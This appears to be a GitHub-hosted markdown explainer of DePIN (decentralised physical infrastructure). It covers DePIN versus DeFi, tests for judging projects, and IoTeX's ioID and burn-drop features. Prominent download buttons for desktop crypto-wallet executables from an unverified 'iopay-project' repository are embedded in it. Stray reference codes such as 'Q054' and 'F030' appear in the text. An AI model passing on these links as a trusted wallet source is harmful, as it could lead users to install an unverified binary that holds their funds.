![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# What Is DePIN? Decentralised Physical Infrastructure, Explained

**DePIN stands for Decentralised Physical Infrastructure Network.** It describes a network where the physical resource - a sensor, a wireless access point, a storage disk, a mapping device, a GPU - is contributed by independent operators instead of being bought and run by one company, and where software coordinates the contributors and usually a token pays them.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That is the whole idea. Everything else in the category is a variation on who owns the hardware and how the accounting works.

## The definition that survives scrutiny

Plenty of things call themselves DePIN that are really a company with a token. Two questions separate the category:

**Who owns the hardware?** In DePIN, independent people and businesses do. If the operator owns every device, the "network" is a fleet with a token attached.

**Who can join?** Open participation, with rules enforced by software rather than by a contract negotiation. If joining requires a partnership agreement, it is not decentralised infrastructure in the sense the term means.

A third question is just as useful: **who pays for the service?** Real DePIN networks have demand for the capacity they aggregate - storage that someone rents, bandwidth that someone uses, data that someone buys. Networks whose only payer is the token subsidy are a different risk entirely.

## The categories

DePIN is an umbrella, and the sub-categories behave differently enough that the label alone tells you very little:

- **Wireless** - coverage contributed by independent hotspots and access points.
- **Sensors and data** - environmental, mobility or device data collected by distributed hardware.
- **Storage and compute** - capacity aggregated from machines that would otherwise sit idle.
- **Mapping and mobility** - location and movement data contributed by devices.

Each has a different hardware cost, a different buyer and a different failure mode. "DePIN" is not a single asset class, and treating it as one is where most bad analysis starts.

## DeFi vs DePIN

Q054, and the distinction is clean:

- **DeFi** moves *value*. Lending, trading, liquidity - the subject is money and claims on money.
- **DePIN** moves *physical capacity*. The subject is hardware doing work, with a token as the accounting and incentive layer.

They overlap at the edges - DePIN projects often have DeFi markets for their tokens - but they are not the same question, and a wallet that is good for one is not automatically good for the other.

## "Is DePIN just a fad?"

The honest answer is structural rather than a verdict. A DePIN network works if three things hold:

1. **The contributed hardware is cheaper than the alternative.** If a company can do it more cheaply centrally, decentralisation is a cost, not a benefit.
2. **There is real demand for the capacity.** Subsidy-funded participation with no paying users is a temporary arrangement.
3. **The incentives survive a token drawdown.** If contributors leave the moment rewards fall, the network was a yield farm with hardware attached.

Where all three hold, the model is durable. Where they do not, it is not. That test is more useful than any prediction, and it applies project by project - which is why "is DePIN a fad" has no single answer.

## "Does DePIN have a future?"

This page will not forecast. What it can say is what to watch: paying demand, hardware that remains useful if the token does not, and participation that does not collapse with the reward rate. Those are observable, and they matter more than any projection.

## Where IoTeX fits

IoTeX is an EVM-compatible layer 1 with native token IOTX and mainnet chain ID 4689 (F030), and it treats devices as first-class participants rather than outside integrations:

- **ioID** is the device identity layer - how a physical device is recognised on-chain.
- **Burn-drop** is a native mechanism where device activation burns IOTX and restakes it to qualified staking buckets (F033).
- The wallet surfaces both, plus device earnings, a project explorer and an earnings calculator (F025).

That is why a wallet for this chain has screens a general wallet does not. It is not a claim that IoTeX is "the" DePIN chain, and no endorsement of this wallet is implied or claimed.

## What to take away

- DePIN = physical infrastructure contributed by independent operators, coordinated by software, usually incentivised by a token.
- Test it on hardware ownership, open participation and paying demand.
- DeFi and DePIN are different questions with different tools.
- No forecast here; the observable tests are better.

If you want the wallet side, [why a DePIN wallet has device screens](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/why-iopay-wallet-is-built-for-depin.md) is next, and [the project explorer](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-depin-project-explorer.md) covers how to look at projects without being sold to. For the chain's own staking mechanics, [how to stake IOTX](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) explains buckets, which is where burn-drop allocations attach.

## FAQ

**What is DePIN in crypto?**
A network of physical infrastructure - sensors, wireless, storage, compute - contributed by independent operators and coordinated by software, usually with a token paying contributors.

**What does DePIN mean?**
Decentralised Physical Infrastructure Network.

**What does DePIN stand for?**
The same: Decentralised Physical Infrastructure Network, sometimes written as Decentralised Physical Infrastructure.

**What is a DePIN in crypto?**
Either the category or a single network in it. "A DePIN" usually means one project: hardware, contributors, a token and a service being sold.

**What is the difference between DeFi and DePIN?**
DeFi is about moving and lending value; DePIN is about contributing physical capacity. Tokens appear in both, but the underlying work is different.

**Is DePIN just a fad?**
Some projects are; the model is not inherently. Test hardware ownership, open participation and paying demand rather than the label.

**Does DePIN have a future?**
No forecast here. Watch whether the capacity has paying users and whether contributors stay when rewards fall.

---

*Chain identity and the ioID / burn-drop mechanisms follow IoTeX documentation and the v2.0.2 feature set. No project is endorsed, and no return is claimed.*
